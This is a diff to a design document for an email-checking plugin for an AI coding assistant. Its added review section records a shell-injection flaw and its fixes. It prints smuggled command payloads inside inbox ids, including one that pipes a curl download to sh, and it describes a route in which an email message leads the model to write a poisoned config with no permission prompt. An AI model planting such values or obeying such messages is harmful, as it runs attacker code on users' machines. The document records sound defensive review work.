@@ -174,7 +174,7 @@ plugins/agentmail/
 ├── scripts/                                          + plugin-root shared (AGENTS.md § sharing)
 │   ├── agentmail-preflight.sh                        → moved from skills/using-agentmail/scripts/
 │   ├── agentmail-contacts.sh                         + contacts store CRUD
-│   └── agentmail-inbox.sh                            + resolve + cache the inbox id
+│   └── (no agentmail-inbox.sh — folded into the hook; see §9)
 ├── references/                                       + plugin-root shared
 │   ├── replying.md                                   + reply/reply-all/forward/draft mechanics
 │   ├── agent-mail-protocol.md                        + the [HANDOFF]/[ASK]/[FYI]/[DONE] contract
@@ -427,7 +427,8 @@ SessionStart (startup|resume)          UserPromptSubmit (no matcher)
                          │
    config missing ───────┼────────────────────────────────► exit 0, silent
    enabled:false / mode:"off" ───────────────────────────► exit 0, silent
-   no python3 and no jq (cannot build safe JSON) ────────► exit 0, silent
+   no python3 (cannot read or build safe JSON) ──────────► exit 0, silent
+   no HOME and no XDG_CONFIG_HOME/XDG_CACHE_HOME ────────► exit 0, silent
    preflight --local != 20  (no CLI, or no key) ─────────► exit 0, silent
    within cooldown ─────────────────────────────────────► exit 0, silent
         │   UserPromptSubmit: now - last_checked_at < check_every_minutes
@@ -547,10 +548,21 @@ are belt and braces.
 - It performs **read-only** calls. It never marks anything read, never labels, never drafts.
   Marking read after triage is a real workflow, but it is a mutation and stays behind a
   permission prompt in `check-mail`, not in a hook that runs unattended.
-- It writes only under `$HOME` (config dir, cache dir). Nothing in the repo, nothing in `/tmp`.
-- The injected string is built with `python3` (fallback `jq`) — never `printf` — because
-  previews contain quotes, newlines, and non-ASCII, and a hand-built JSON string would break
-  the harness's parse on the first apostrophe. With neither tool available, the hook is silent.
+- It writes only under the config and cache directories it derives from the environment.
+  Nothing in the repo. **Nothing in `TMPDIR` either** — the scratch file holding the API
+  response carries subjects, senders, and previews, so it lives beside the state file rather
+  than in a shared `/tmp`. *(Corrected after review: the first build used `mktemp -d` with no
+  `dir`, which put message content in `TMPDIR`, while this line claimed otherwise.)*
+- The injected string is built with `python3` — never `printf` — because previews contain
+  quotes, newlines, and non-ASCII, and a hand-built JSON string would break the harness's
+  parse on the first apostrophe. **python3 (or `python`) is required; there is no `jq`
+  fallback.** *(Corrected after review: this line promised one and none was ever written.
+  Two implementations of the same escaping rules is how they drift, so the claim was dropped
+  rather than implemented — with no interpreter the hook is silently inert.)*
+- Every inbox id — from the API, from config, from the hook's own cache — is validated
+  against a strict address pattern before it reaches a command line or a state key, and the
+  plan is parsed with `read`, never `eval`. *(Added after review: `eval` over the planner's
+  output was a live injection sink; see §9.)*
 - Truncation is UTF-8-boundary-safe.
 
 ### Codex: what works, what degrades
@@ -725,3 +737,64 @@ Epic **claude-plugins-nd5f**, with one issue per build unit:
 | claude-plugins-0t05 | live-probe Codex `additionalContext` delivery (§4, gap 2) |
 | claude-plugins-hyuk | release bump must document the preflight exit-code change (§7 Q5) |
 | claude-plugins-koht | **out of scope:** `handoff`'s plain-stdout hook under Codex (§1.5) |
+
+---
+
+## 9. Review round (2026-08-12): what an adversarial pass found
+
+An independent review after the build confirmed the suites, secret hygiene, redaction,
+preflight reclassification, and skill contracts, and found eight real defects. All are fixed
+on this branch with regression tests. Recorded here because three of them were bugs of
+*reasoning*, not typos, and the reasoning is the reusable part.
+
+### CRITICAL — `eval` over planner output was a shell-injection sink
+
+The hook printed its decision as `KEY=value` lines and read them back with `eval`. One of
+those keys is the inbox id, which originates outside the process. Two paths were reproduced
+end to end:
+
+1. **Remote → disk → shell.** An `inboxes list` response with an id like
+   `a$(touch …/PWNED)@agentmail.to` was stored verbatim as a state key, read back as a cached
+   inbox on the next `UserPromptSubmit`, and executed. The file was created; the hook exited
+   0 and printed nothing.
+2. **Config → shell.** `--init --inbox <value>` wrote whatever it was given, and `check-mail`
+   allowlists `--init`, so the model can create that config with no permission prompt. A
+   message reading *"my inbox moved to `x$(curl …|sh)@agentmail.to`"* is then enough to arm a
+   payload that fires before every prompt.
+
+The lesson is the ordering: this plugin's *purpose* is to read text written by strangers, so
+"where does this string come from" had to be asked of every value, and it was asked of the
+message bodies and not of the ids around them.
+
+Fixed three ways, each independently sufficient: the plan is parsed with
+`while IFS='=' read`, so nothing is interpreted; every inbox id is validated against a strict
+address pattern before it reaches a command line, a config file, or a state key; and ids that
+fail are dropped rather than sanitized. `tests/mail-check_test.sh` reproduces all three paths
+and asserts no execution, no output, and no poisoned state — and the payload is confirmed
+live under the old `eval` form, so the test is not vacuous.
+
+### MAJOR — a sentinel state key bricked the hook permanently
+
+A failed inbox resolution stored `INBOX="(unresolved)"`, and state keys *are* the inbox
+cache, so the next run read the sentinel back as a perfectly plausible cached inbox: it
+queried `--inbox-id unresolved` forever and injected a false count, recoverable only by
+deleting the cache by hand. `eval "INBOX=(unresolved)"` is also array-assignment syntax,
+which is how the parentheses vanished.
+
+Fixed: a failed resolution writes a **top-level** `unresolved_last_checked_at` and nothing
+else, the cooldown gates on it, and the next window retries. Recovery is automatic and the
+marker is cleared on the first success. Tested, including that no query is ever made against
+a sentinel.
+
+### The MINORs
+
+| | Fix |
+|---|---|
+| `set -u` + unset `HOME` aborted the prologue (only `hooks.json`'s `\|\| true` hid it) | every `HOME`/XDG read is `${VAR:-}` guarded; the hook exits 0 silently with no writable location, and `agentmail-contacts.sh` **fails closed** (exit 64) rather than writing a relative `./.config/…` into the current directory |
+| byte caps overshot by up to 2 bytes, and clipping the assembled block destroyed the auto-mode caveat | the ellipsis costs 3 bytes and is now subtracted; the header and the caveat get their budget first and the listing fills what is left; an impossible cap degrades to one line rather than dropping the caveat |
+| `contacts` allowlisted its whole script, so `remove --yes` and `update` ran unprompted | scoped to `get`/`list`, matching `replying` and `relay-work-order` |
+| "python3 (fallback `jq`)" — no fallback existed | claim dropped, python3 documented as required. Two implementations of the same escaping rules is how they drift |
+| "nothing in `/tmp`" — `mktemp -d` put the API response (subjects, senders, previews) in `TMPDIR` | scratch dir moved beside the state file under the cache directory |
+| a message with no `message_id` re-announced every cooldown forever | re-notify falls back to timestamp+sender+subject, then to the count |
+| the static every-exit-zero test scanned only after one marker and matched only `exit <digit>`, so `exit $?` and a redefined `quit()` were invisible | it now scans the prologue and the unattended region separately with patterns covering `exit $?` and `quit()`; both new checks were confirmed to fire against deliberately broken copies |
+| `agentmail-inbox.sh` (specced) was folded into the hook, and `added_at` was specced but never written | the first is marked in §2; the second is implemented, with a test |
